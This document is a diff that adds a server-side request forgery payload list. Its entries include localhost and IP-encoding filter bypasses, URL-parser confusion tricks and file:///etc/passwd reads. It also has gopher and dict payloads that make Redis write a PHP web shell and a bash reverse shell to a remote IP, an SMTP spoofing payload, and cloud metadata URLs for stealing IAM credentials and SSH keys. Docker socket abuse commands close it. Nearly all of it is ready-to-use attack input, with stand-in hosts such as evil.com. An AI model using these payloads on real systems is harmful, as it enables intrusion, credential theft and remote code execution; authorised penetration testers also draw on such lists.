@@ -1,0 +1,156 @@
+http://localhost:80
+http://localhost:443
+http://localhost:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/ 
+http://[::]:22/ 
+http://[::]:3128/ 
+http://0000::1:80/
+http://0000::1:25/ 
+http://0000::1:22/ 
+http://0000::1:3128/ 
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]
+localhost:+11211aaa
+localhost:00011211aaaa
+http://0/
+http://127.1
+http://127.0.1
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+curl -v "http://evil$google.com"
+$google = ""
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+0://evil.com:80;http://google.com:80/ 
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+ssrf.php?url=sftp://evil.com:11111/
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
+gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+gopher://127.0.0.1:6379/_save
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+gopher://127.0.0.1:6379/_save
+<link rel=attachment href="file:///root/secret.txt">
+<script> exfil = new XMLHttpRequest(); exfil.open("GET","file:///etc/passwd"); exfil.send(); exfil.onload = function(){document.write(this.responseText);} exfil.onerror = function(){document.write('failed!')} </script>
+http://brutelogic.com.br/poc.svg -> simple alert
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
+http://instance-data
+http://169.254.169.254
+http://169.254.169.254.nip.io/
+Static:http://nicob.net/redir6a
+Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+http://425.510.425.510/ Dotted decimal with overflow
+http://2852039166/ Dotless decimal
+http://7147006462/ Dotless decimal with overflow
+http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
+http://0xA9FEA9FE/ Dotless hexadecimal
+http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
+http://0251.0376.0251.0376/ Dotted octal
+http://0251.00376.000251.0000376/ Dotted octal with padding
+http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
+curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+curl http://169.254.169.254/metadata/v1.json | jq
+http://169.254.169.254/openstack
+http://169.254.169.254/2009-04-04/meta-data/ 
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+curl -L http://127.0.0.1:2379/version
+curl http://127.0.0.1:2379/v2/keys/?recursive=true
+http://127.0.0.1:2375/v1.24/containers/json
+curl http://rancher-metadata/<version>/<path>
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
